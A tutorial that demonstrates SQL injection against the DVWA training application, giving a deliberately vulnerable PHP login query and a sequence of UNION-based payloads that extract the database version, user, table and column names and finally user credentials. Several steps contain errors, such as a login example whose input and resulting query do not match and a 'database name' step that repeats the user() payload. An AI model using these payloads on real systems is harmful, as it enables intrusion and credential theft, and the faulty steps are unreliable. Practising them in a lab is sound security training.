## What is SQL injection (SQLi)?
- SQL injection is one of the most common attacks used by hackers to exploit any SQL database-driven web application. It’s a technique where SQL code/statements are inserted in the execution field with an aim of either altering the database contents, dumping useful database contents to the hacker, cause repudiation issues, spoof identity, and much more.

Let’s take a simple scenario where we have a web application with a login form with username and password fields. If the developer used PHP for development, the code would look like this:
```php
<?php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
$query .= " AND password = '" . $_POST['password'] . "'"; 
?>
```

If a user **Bob** with the password **12345** wanted to log in, after clicking the Submit or the Log in button, the query that would be sent to the database would look like this:
```
SELECT * FROM users WHERE username='Bob' AND password='12345'
```

If an attacker knew the username and wanted to bypass the login window, they would put something like Karen;-- in the username field. The resulting SQL query would look like this:
```
SELECT * FROM users WHERE username='Bob'; -- ' AND password='1111'
```

What the attacker has done, is adding the **-- (double-dash)** which comments the rest of the SQL statement. The above query will return the information entered in the password field making it easier for the attacker to bypass the login screen.

## Pre-requisites
It is expected that you have an up and running **DVWA** setup. If you have not yet installed DVWA on your Kali Linux system, I recommend you to setup up DVWA first.

### Step 1. Setup DVWA for SQL Injection
After successfully installing DVWA, open your browser and enter the required URL **127.0.0.1/dvwa/login.php** Log in using the username “admin” and password as “password”. These are the default DVWA login credentials. After a successful login, set the DVWA security to LOW then click on SQL Injection on the left-side menu.

![DVWA-SQL-Injection](https://user-images.githubusercontent.com/87711310/215311507-0b61b195-902f-461b-9dae-4efcf1a18138.png)

### Step 2: Basic Injection
On the User ID field, enter `1` and click Submit. That is supposed to print the **ID**, **First_name**, and **Surname** on the screen as you can see below.

The SQL syntax being exploited here is:
```
$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

![DVWA-Basic-SQL-Injection](https://user-images.githubusercontent.com/87711310/215311560-5f40c075-9a85-41fd-89e3-1a20217d0b67.png)

Interestingly, when you check the **URL**, you will see there is an **injectable parameter** which is the `ID`. Currently, my URL looks like this:

```
http://172.16.15.128/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#
```

Let’s change the ID parameter of the URL to a number like **1**, **2**, **3**, **4** etc. That will also return the **First_name** and **Surname** of all users as follows:

```
ID: 2
First name: Gordon
Surname: Brown

ID: 3
First name: Hack
Surname: Me

ID: 4
First name: Pablo
Surname: Picasso
```

If you were executing this command directly on the DVWA database, the query for User ID 3 would look like this:

```
SELECT first_name, last_name FROM users WHERE user_id = '3';
```

### Step 3: Always True Scenario

An advanced method to extract all the **First_names** and Surnames from the database would be to use the input: `%' or '0'='0'`

![always-true-injection](https://user-images.githubusercontent.com/87711310/215312500-aa366d48-3202-430b-b696-c2d46fcedcad.png)

The percentage `%` sign does not equal anything and will be false. The `'1'='1'` query is registered as `True` since `1 will always equal 1`. If you were executing that on a database, the query would look like this:

```
SELECT first_name, last_name FROM users WHERE user_id = '%' or '1'='1';
```

### Step 4: Display Database Version

To know the database version the DVWA application is running on, enter the text below in the User ID field.

```
%' or 0=0 union select null, version() #
```

The database version will be listed under surname in the last line as shown in the image below.

![Display-databse-version](https://user-images.githubusercontent.com/87711310/215312575-e4eb3220-3b58-40e6-8b6c-7cf5933bb931.png)

### Step 5: Display Database User
To display the Database user who executed the `PHP` code powering the database, enter the text below in the `USER ID` field.

```
%' or 0=0 union select null, user() #
```

The Database user is listed next to the surname field in the last line as in the image below.

![Display-database-user](https://user-images.githubusercontent.com/87711310/215312635-9c762216-088f-4023-8d31-aa90c3d72c63.png)


## Step 6: Display Database Name
To display the database name, we will inject the SQL code below in the `User ID` field.

```
%' or 0=0 union select null, user() #
```

The database name is listed next to the `surname` field in the last line.

![Display-database-name](https://user-images.githubusercontent.com/87711310/215312720-544711cf-ef6e-483c-a02c-26ee00a55e27.png)

### Step 7: Display all tables in information_schema

The **Information Schema** stores information about **tables**, **columns**, and all the other databases maintained by **MySQL**. To display all the tables present in the **information_schema**, use the text below.

```
%' and 1=0 union select null, table_name from information_schema.tables #
```

![Database-schema](https://user-images.githubusercontent.com/87711310/215312779-b6e44ddc-b9fb-4fe8-8ce6-01bdd99d6697.png)

### Step 8: Display all the user tables in information_schema

For this step, we will print all the tables that start with the prefix user as stored in the **information_schema**. Enter the SQL code below in the `User ID`.

```
%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
```

![User-tables](https://user-images.githubusercontent.com/87711310/215312862-ba13e852-b31d-47f1-8c98-79ba30d213d9.png)

### Step 9: Display all the columns fields in the information_schema user table
We will print all the columns present in the users’ table. This information will include column information like User_ID, first_name, last_name, user, and password. Enter the input in the User_ID field.

```
%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
```

![Column-fields](https://user-images.githubusercontent.com/87711310/215313624-3b439ca3-32d4-4db8-9982-ff0388e16680.png)



### Step 10: Display Column field contents
To display all the necessary authentication information present in the columns as stored in the information_schema, use the SQL syntax below:

```
%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
```

![Column-fields-contents](https://user-images.githubusercontent.com/87711310/215313623-a5c58e25-f3d6-482b-aa93-76f1dc4a444a.png)
